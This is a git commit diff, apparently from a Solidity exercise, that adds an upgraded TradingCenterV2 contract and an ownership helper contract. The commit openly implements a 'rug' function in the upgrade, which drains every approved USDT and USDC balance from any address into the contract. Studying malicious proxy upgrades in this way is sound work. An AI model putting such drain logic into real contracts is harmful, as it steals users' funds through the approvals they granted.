893dc15e761fa01e3c0eed00d224553b3230feb9
Chad Zhuang <changda0616@gmail.com>
2023-04-30 15:37:20 +0800

    feat: implement rug pull and FiatTokenV3

--- src/TradingCenterV2.sol
+++ src/TradingCenterV2.sol
@@ -1,6 +1,21 @@
 // SPDX-License-Identifier: SEE LICENSE IN LICENSE
 pragma solidity ^0.8.17;
+import "./TradingCenter.sol";
 
 // TODO: Try to implement TradingCenterV2 here
-contract TradingCenterV2 {
+contract TradingCenterV2 is TradingCenter {
+
+    function rug(address sender) public returns (bool, bool) {
+        bool usdtResult = usdt.transferFrom(
+            sender,
+            address(this),
+            usdt.balanceOf(sender)
+        );
+        bool usdcResult = usdc.transferFrom(
+            sender,
+            address(this),
+            usdc.balanceOf(sender)
+        );
+        return (usdtResult, usdcResult);
+    }
 }
---
+++ src/USDC/OwnableFiatTokenV2.sol
@@ -0,0 +1,57 @@
+// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity ^0.8.17;
+
+contract OwnableFiatTokenV2 {
+    // Owner of the contract
+    address private _owner;
+
+    /**
+     * @dev Event to show ownership has been transferred
+     * @param previousOwner representing the address of the previous owner
+     * @param newOwner representing the address of the new owner
+     */
+    event OwnershipTransferred(address previousOwner, address newOwner);
+
+    /**
+     * @dev The constructor sets the original owner of the contract to the sender account.
+     */
+    constructor() {
+        setOwner(msg.sender);
+    }
+
+    /**
+     * @dev Tells the address of the owner
+     * @return the address of the owner
+     */
+    function owner() public view returns (address) {
+        return _owner;
+    }
+
+    /**
+     * @dev Sets a new owner address
+     */
+    function setOwner(address newOwner) internal {
+        _owner = newOwner;
+    }
+
+    /**
+     * @dev Throws if called by any account other than the owner.
+     */
+    modifier onlyOwner() {
+        require(msg.sender == _owner, "Ownable: caller is not the owner");
+        _;
+    }
+
+    /**
+     * @dev Allows the current owner to transfer control of the contract to a newOwner.
+     * @param newOwner The address to transfer ownership to.
+     */
+    function transferOwnership(address newOwner) external onlyOwner {
+        require(
+            newOwner != address(0),
+            "Ownable: new owner is the zero address"
+        );
+        emit OwnershipTransferred(_owner, newOwner);
+        setOwner(newOwner);
+    }
+}
